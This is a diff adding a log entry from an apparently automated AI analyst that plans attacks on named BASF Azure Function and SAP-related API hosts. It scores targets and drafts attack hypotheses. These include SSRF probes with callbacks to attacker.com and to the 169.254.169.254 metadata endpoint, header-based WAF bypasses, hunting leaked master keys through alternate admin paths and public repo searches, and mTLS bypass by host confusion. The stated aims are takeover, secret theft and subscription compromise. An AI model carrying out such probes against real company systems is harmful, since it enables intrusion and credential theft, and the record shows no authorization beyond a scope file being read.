@@ -152,3 +152,105 @@ testability: AUTH_HELPED
 ## STEP 7 — RISK
 
 [RISK] basf: 55 — Two production Azure Function Apps with exposed admin API (key-gated), three mTLS-gated dev endpoints suggesting SAP integration, and 10k+ wildcard DNS noise indicating large attack surface. Auth-gated surface reduces immediate risk but cloud metadata SSRF on Functions is a high-impact class if any trigger processes user URLs. Requires authenticated testing for definitive findings.
+===== ANALYST nemotron3 2026-09-03 17:55:27 UTC =====
+[0m
+> build · nemotron-3-ultra-free
+[0m
+[0m✱ [0mGlob "**/*"[90m 32 matches[0m
+[0m→ [0mRead inventory/basf.md
+[0m→ [0mRead knowledge/index.md
+[0m→ [0mRead leads/lead-nemotron3.md
+[0m→ [0mRead leads/lead-mimo.md
+[0m→ [0mRead leads/reposcan-basf.md
+[0m→ [0mRead reports/hypotheses-nemotron3.txt
+[0m→ [0mRead probe-results.md
+[0m→ [0mRead state_nemotron3.json
+[0m→ [0mRead scope.yml
+[0m→ [0mRead recon-notes/DEEPER-FINDINGS.md
+[0m→ [0mRead recon-notes/DEDICATED-DEEP.md
+[0m→ [0mRead triage/run-2026-09-03-15-10.md
+Now I have the full context. Let me execute the 8-step analysis.
+
+---
+
+## STEP 1 — DELTA
+
+[CHANGED] `ap-digitalconnect.api.basf.com/admin/host/keys` → HTTP 404 (was expected 401 Bearer); admin surface differs from standard Azure Function App defaults  
+[CHANGED] `ap-eupf.api.basf.com` SSRF probes (`/api/health?url=...`, `/api/<function>?url=...`) → HTTP 403 (blocked by WAF/gateway); SSRF vector appears mitigated at edge  
+[NO_DELTA] No new dedicated hosts since 2026-09-03 deep enum (9 hosts stable)
+
+---
+
+## STEP 2 — PRIORITIZE
+
+[PRIO] ap-digitalconnect.api.basf.com,7.4,attack_surface=8,business_value=9,tech_exposure=7,gate_ease=3,cloud_surface=9,freshness=8  
+[PRIO] ap-eupf.api.basf.com,7.1,attack_surface=7,business_value=9,tech_exposure=7,gate_ease=3,cloud_surface=9,freshness=8  
+[PRIO] dev-clientcert-sap.api.basf.com,6.1,attack_surface=6,business_value=7,tech_exposure=6,gate_ease=2,cloud_surface=7,freshness=8  
+[PRIO] dev-ext001.api.basf.com,5.8,attack_surface=5,business_value=6,tech_exposure=6,gate_ease=2,cloud_surface=6,freshness=8  
+[PRIO] dev-int001.api.basf.com,5.8,attack_surface=5,business_value=6,tech_exposure=6,gate_ease=2,cloud_surface=6,freshness=8  
+
+---
+
+## STEP 3 — HYPOTHESES
+
+[HYP] Azure Function master key leak via non-standard admin path exposure  
+class: AUTH  
+asset: ap-digitalconnect.api.basf.com  
+confidence: 55  
+reasoning: Standard `/admin/host/keys` returns 404 (not 401), suggesting custom routing or removed endpoint; master key may still be accessible via alternate paths (`/admin/keys`, `/.azurefunctions/keys`, `/runtime/webhooks/host/keys`) or leaked in CI/CD artifacts  
+evidence_needed: Valid master/system key accepted by any admin endpoint, or key found in public repo/artifact  
+verify_steps: GET https://ap-digitalconnect.api.basf.com/admin/keys (test alt path), GET https://ap-digitalconnect.api.basf.com/runtime/webhooks/host/keys (Azure internal), passive GitHub/GitLab dork search for `basf.com` + `function` + `master` + `key`  
+impact: Full Function App takeover — code execution, env var disclosure (DB conn strings, service principal secrets), lateral movement to Azure subscription  
+testability: PASSIVE  
+
+[HYP] SSRF via Azure Function HTTP trigger with WAF bypass  
+class: SSRF  
+asset: ap-eupf.api.basf.com  
+confidence: 40  
+reasoning: Probes to common params (`url`, `health`) returned 403 (WAF/edge block); however, Azure Functions often have multiple triggers with different auth levels; unexplored function names or header-based SSRF (`x-forwarded-url`, `x-callback-url`) may bypass edge filtering  
+evidence_needed: DNS/HTTP callback from cloud metadata endpoint (169.254.169.254) via any function trigger  
+verify_steps: GET https://ap-eupf.api.basf.com/api/HttpTrigger1?url=http://attacker.com (enumerate function names), GET https://ap-eupf.api.basf.com/api/HttpTrigger1 with header `X-Forwarded-Url: http://169.254.169.254/metadata/instance`, GET https://ap-eupf.api.basf.com/api/HttpTrigger1 with header `X-Callback-Url: http://attacker.com`  
+impact: Cloud metadata access → managed identity tokens → Azure resource access → subscription compromise  
+testability: AUTH_HELPED  
+
+[HYP] Client certificate auth bypass via certificate transparency or weak CA on dev endpoints  
+class: AUTH  
+asset: dev-clientcert-sap.api.basf.com  
+confidence: 35  
+reasoning: Three dev endpoints (`dev-clientcert-sap`, `dev-ext001`, `dev-int001`) return HTTP 400 requiring client cert; if BASF uses a public CA with CT-logged client certs, or weak self-signed CA, attacker could obtain/forge valid cert; SAP integration implies high-value backend  
+evidence_needed: Valid client certificate accepted by any dev endpoint, or CT logs showing BASF-issued client certs for `*.api.basf.com`  
+verify_steps: GET https://dev-clientcert-sap.api.basf.com/ (confirm 400), query crt.sh for `%.api.basf.com` client certs, test mTLS bypass via SNI/Host header confusion (send cert for `dev-clientcert-sap.api.basf.com` to `dev-ext001.api.basf.com`)  
+impact: Authenticated access to SAP-integrated dev environment — potential PII, financial data, supply chain pivot  
+testability: PASSIVE  
+
+---
+
+## STEP 4 — SELF-CRITIQUE
+
+[PARKED] Client certificate auth bypass via certificate transparency or weak CA on dev endpoints: confidence 35 — below threshold; CT search passive but low probability; no evidence BASF uses public CA for mTLS; dev endpoints likely non-production  
+[FINAL] Azure Function master key leak via non-standard admin path exposure: confidence 55 — survives; concrete alt paths to test passively  
+[FINAL] SSRF via Azure Function HTTP trigger with WAF bypass: confidence 40 — survives; edge blocks common params but function enum + header-based vectors untested  
+
+Ranked survivors:  
+1. [55] ap-digitalconnect.api.basf.com: Azure Function master key leak via non-standard admin path exposure  
+2. [40] ap-eupf.api.basf.com: SSRF via Azure Function HTTP trigger with WAF bypass  
+
+---
+
+## STEP 5 — NEXT ACTION
+
+[NEXT] PROBE: GET https://ap-digitalconnect.api.basf.com/admin/keys (test alternate admin keys path)  
+
+---
+
+## STEP 6 — LEARNING
+
+[LEARN] REJECTED AUTH @ dev-clientcert-sap.api.basf.com: client cert bypass speculative; no CT evidence BASF uses public CA for mTLS; dev endpoints may be non-production  
+[LEARN] CHANGED AUTH @ ap-digitalconnect.api.basf.com: `/admin/host/keys` returns 404 not 401; admin surface non-standard — shifts key leak hunt to alt paths + passive repo search  
+[LEARN] MITIGATED SSRF @ ap-eupf.api.basf.com: common `url` param probes return 403; WAF/edge blocks metadata endpoint; header-based or alternate function triggers remain untested  
+
+---
+
+## STEP 7 — RISK
+
+[RISK] basf: 50 — Two production Azure Function Apps with non-standard admin API (404 on standard path, auth-gated), three mTLS-gated dev endpoints suggesting SAP integration, and 10k+ wildcard DNS noise. SSRF vector partially mitigated at edge (403 on common params). Auth-gated surface reduces immediate risk; master key leak via alt paths or CI/CD remains highest-impact class. Requires authenticated testing for definitive findings.
